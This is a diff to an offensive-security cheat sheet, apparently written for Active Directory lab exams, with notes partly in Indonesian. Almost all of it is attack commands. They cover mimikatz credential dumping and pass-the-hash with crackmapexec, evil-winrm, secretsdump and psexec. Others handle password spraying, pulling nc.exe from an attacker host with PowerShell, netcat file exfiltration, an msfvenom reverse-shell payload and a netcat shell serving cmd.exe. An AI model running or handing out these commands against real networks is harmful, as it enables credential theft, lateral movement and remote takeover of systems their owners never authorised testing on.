@@ -24,8 +24,10 @@ PS C:\Temp> Get-DomainGroup -MemberIdentity Herman | select samaccountname
 PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
 PS C:\Temp> Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
 PS C:\Temp> Get-DomainGroup -MemberIdentiy Herman | select samaccountname 
+PS C:\Temp> Invoke-SprayEmptyPassword
+PS C:\Temp> .\nmap.ps1 "ip" -Arguments "-sV -T4" -Verbose | Format Table
 
-* Prepared Impacket list:
+* Prepared Impacket list: https://github.com/fortra/impacket/tree/master/examples
 impacket, getnpusers.py 
 impacket smbserver
 
@@ -35,6 +37,22 @@ domain computer
 direct members
 outbound object control -> punya privilege apa saja
 inbound obect contol -> siapa yg bisa masuk kesana / gimana cara kita masuk
+
+* Transfer file:
+- Netcat:
+A : nc -nvlp 1234 > file.txt
+T : nc Aip 1234 < file.txt
+- Web Servers:
+A : python3 -m http.server 80
+T : curl -o file.exe http://ip:80/file.exe OR
+T : wget http://ip:80/file.exe
+- SMB:
+A : sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+T : copy \\Aip\kali\reverse.exe C:\PrivEsc\reverse.exe
+- Powershell:
+PS powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"
+- smb download:
+recur
 
 * If any github enum:
 git log
@@ -47,12 +65,23 @@ sekurlsa::logonpasswords
 lsadump::sam
 
 * Run this for RDP :
-xfreerdp
+xfreerdp /u:uname /p:pass /cert:ignore /v:ip
 
-* Run this for cme :
+* Run this for pass the hash && enum:
 crackmapexec.py smb ip -u adnub -H hash
-proxychains smbclient -U mdm.com/kocho --pw-nt-hash //200.10.10.50/Developer
-proxychains crackmapexec smb '200.10.10.50' -u 'kocho' -H '2799fae8a085db9f2f298d6378c5df32:2799fae8a085db9f2f298d6378c5df32' -d 'mdm.com' --share
+crackmapexec <IP> -u 'user' -p 'password' --pass-pol
+crackmapexec smb <IP> -u users.txt -p passwords.txt
+proxychains smbclient -U mdm.com/kocho --pw-nt-hash //iptarget2/Developer
+proxychains crackmapexec smb 'iptarget2' -u 'kocho' -H 'lmhash:ntlm' -d 'domain' --share
+evil-winrm -i <IP> -u <User> -H <NThash>
+secretsdump.py <User>@<IP> -hashes <Hash>
+smbclient //<IP>/<Share> -U <User> --pw-nt-hash <Hash> -W <Domain>
+xfreerdp /v:10.10.10.100 /u:moe /pth:58a478135a93ac3bf058a5ea0e8fdb71
+psexec.py admin@ip -hashes hash
+
+* Password Spraying :
+cme smb iptarget -u /path/to/users.txt -p password
+kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password
 
 * Find string on windows:
 type * | findstr password
@@ -85,6 +114,7 @@ powershell -c iwr http://ipkali/nc.exe -OutFile \windows\temp\nc.exe;windows\tem
 
 * Generate reverse shell:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=yourip LPORT=66 -f exe -o reverse.exe
+win : nc.exe -nv ip port cmd.exe
 
 * Reporting:
 hostname && whoami && type \users\Administrator\desktop\proof.txt && ipconfig
